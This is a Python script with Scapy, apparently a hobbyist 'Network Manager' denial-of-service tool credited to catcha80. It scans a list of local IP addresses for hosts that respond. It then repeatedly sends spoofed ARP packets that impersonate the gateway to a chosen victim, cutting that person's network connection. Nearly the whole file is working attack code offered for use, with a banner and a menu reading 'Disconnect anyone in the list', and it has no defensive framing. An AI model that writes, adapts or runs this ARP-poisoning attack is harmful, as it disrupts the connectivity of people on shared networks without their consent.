import scapy as scapy
from scapy.all import *
import time
import socket
from pystyle import *
import sys
from getmac import *
import netifaces


__licence__ = "Code created by catcha80#2887 Discord: https://discord.gg/uYbkPB7qZV  Github: https://github.com/catcha8"

def get_ip():
    host = socket.gethostname()
    ip = socket.gethostbyname(host) 
    return ip

def is_up(line : str):

    port = 80

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)

        addr = (line, port)
        check = sock.connect_ex(addr)
        sock.close()

        return not check
    except:
        return False

def spoof(target_ip, gateway_ip, mac_adress):
    packet = Ether(dst = mac_adress) / ARP(op = 1, pdst = target_ip, psrc = gateway_ip) 
    sendp(packet)	


def scan_ip():
    global list

    file = Write.Input("Drag a file with all ip adress ('/' in the file path must be remplaced by '\\'): ", Colors.red_to_blue, interval=0.005)  
    file1 = open(file, 'r')

    list = ""
    count = 0
    for line in file1:
        count += 1

        print(f"Scanning file: ", file, ", line: ", count)

        if is_up(line.strip()):
            list += "\n" + line.strip()

    file1.close()
    Write.Input(f"Scan ended, this is the list of the connected IP\n {list}", Colors.red_to_blue, interval=0.005)


def cut_connection():
    IP = Write.Input(f"Input the IP that you want to cut his connection fromn this list: \n {list}\n(Press CTRL + C to cancel poisoning)\n\n>", Colors.red_to_blue, interval=0.005)
    ip_mac = get_mac_address(ip=IP)

    gws = netifaces.gateways()
    gateway_ip = gws['default'][netifaces.AF_INET][0]

    try:
        sent_packets_count = 0
        while True:
            spoof(IP, gateway_ip, ip_mac)
            sent_packets_count = sent_packets_count + 1
            print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
            time.sleep(0.2)

    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting")
        print("[+] Arp Spoof Stopped")    

System.Title("Dos Tool catcha8 Github: https://github.com/catcha8")

banner = """

888b    888          888                                   888      
8888b   888          888                                   888      
88888b  888          888                                   888      
888Y88b 888  .d88b.  888888 888  888  888  .d88b.  888d888 888  888 
888 Y88b888 d8P  Y8b 888    888  888  888 d88""88b 888P"   888 .88P 
888  Y88888 88888888 888    888  888  888 888  888 888     888888K  
888   Y8888 Y8b.     Y88b.  Y88b 888 d88P Y88..88P 888     888 "88b 
888    Y888  "Y8888   "Y888  "Y8888888P"   "Y88P"  888     888  888 
                                                                    
                                                                    
                                                                    
888b     d888                                                       
8888b   d8888                                                       
88888b.d88888                                                       
888Y88888P888  8888b.  88888b.   8888b.   .d88b.   .d88b.  888d888  
888 Y888P 888     "88b 888 "88b     "88b d88P"88b d8P  Y8b 888P"    
888  Y8P  888 .d888888 888  888 .d888888 888  888 88888888 888      
888   "   888 888  888 888  888 888  888 Y88b 888 Y8b.     888      
888       888 "Y888888 888  888 "Y888888  "Y88888  "Y8888  888      
                                              888                   
                                         Y8b d88P                   
                                          "Y88P"                from catcha80#2887
                                                                Discord : https://discord.gg/uYbkPB7qZV
                                                                Github  : https://github.com/catcha8
                                                                                                                                                                                                 
"""[1:]

Anime.Fade(text=Center.Center(banner), color=Colors.green_to_black, mode=Colorate.Diagonal, enter=True)

print("\n"*2)
print(Colorate.Diagonal(Colors.yellow_to_green, Center.XCenter(banner)))
print("\n"*5)    

def main():
    global choix
    choix = int(Write.Input("Choose an option: \n 1: Scan all my privates ip\n 2: Disconnect anyone in the list, you have to scan first\n 3: Exit\n > ", Colors.blue_to_green, interval=0.005))

    if (choix == 1):
        scan_ip()
    elif (choix == 2 and list != ""):
        cut_connection()
    else:
        return


choix = 1
list  = ""

while True and (choix == 1 or choix == 2):
    main()
